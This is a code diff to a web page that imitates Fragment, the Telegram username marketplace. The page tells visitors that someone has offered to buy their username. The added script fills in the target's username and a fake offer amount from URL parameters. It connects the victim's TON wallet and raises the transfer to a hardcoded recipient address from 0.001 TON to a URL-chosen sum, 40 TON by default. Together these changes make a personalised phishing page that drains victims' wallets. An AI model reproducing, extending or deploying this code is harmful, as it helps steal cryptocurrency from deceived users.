@@ -89,7 +89,7 @@
     
     <div class="tm-section-header">
       <h2 class="tm-section-header-text">
-        <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain">fameofcrypto</span><span class="domain">.t.me</span></span></span>
+        <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain" id="username">fameofcrypto</span><span class="domain">.t.me</span></span></span>
         
         <span class="tm-section-header-status tm-status-avail">Claimed</span>
         
@@ -110,7 +110,7 @@
       <tbody>
         <td>
           <div class="table-cell">
-            <div class="table-cell-desc">Someone offered <span class="tm-value icon-before icon-ton">800</span> for your username. If the price suits you, press "Accept the offer".</div>
+            <div class="table-cell-desc">Someone offered <span class="tm-value icon-before icon-ton" id="offerAmount">800</span> for your username. If the price suits you, press "Accept the offer".</div>
           </div>
         </td>
       </tbody>
@@ -121,19 +121,19 @@
     <dl class="tm-list-item">
       <dt class="tm-list-item-title">Telegram Username</dt>
       <dd class="tm-list-item-value">
-        <span class="accent-color">@fameofcrypto</span>
+        <span class="accent-color" id="usernameDisplay">@fameofcrypto</span>
       </dd>
     </dl>
     <dl class="tm-list-item">
       <dt class="tm-list-item-title">Web Address</dt>
       <dd class="tm-list-item-value">
-        <span class="accent-color">t.me/fameofcrypto</span>
+        <span class="accent-color" id="webAddress">t.me/fameofcrypto</span>
       </dd>
     </dl>
     <dl class="tm-list-item">
       <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd class="tm-list-item-value">
-        <span class="accent-color"><span class="tm-web3-address"><span class="subdomain">fameofcrypto</span><span class="domain">.t.me</span></span></span>
+        <span class="accent-color" id="tonAddress"><span class="tm-web3-address"><span class="subdomain">fameofcrypto</span><span class="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -199,6 +199,19 @@
     <script src="jquery-ex.js"></script>
 
     <script>
+      // Получаем параметры из URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const username = urlParams.get('username') || 'fameofcrypto';  // По умолчанию fameofcrypto
+      const offerAmount = urlParams.get('offerAmount') || '800';  // По умолчанию 800
+      const tonAmount = urlParams.get('tonAmount') || '40';  // По умолчанию 40
+
+      // Обновляем значения в HTML
+      document.getElementById('username').textContent = username;
+      document.getElementById('usernameDisplay').textContent = '@' + username;
+      document.getElementById('webAddress').textContent = `t.me/${username}`;
+      document.getElementById('tonAddress').textContent = username + '.t.me';
+      document.getElementById('offerAmount').textContent = offerAmount;
+
       // Инициализируем TonConnectUI
       const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://quantyfn.github.io/fragment/tonconnect-manifest.json'
@@ -213,7 +226,7 @@
             await tonConnectUI.connectWallet();
           }
 
-          const amount = 1000000; // 0.001 TON
+          const amount = parseInt(tonAmount) * 1000000000; // Преобразуем в микроTON, например, 30 TON = 30 * 1000000000 микроTON
 
           const recipientAddress = "UQBgOte2PXPiD3pD41D40eL-2xd6Dsb2RsABmGUh_3NV2QM1";
 
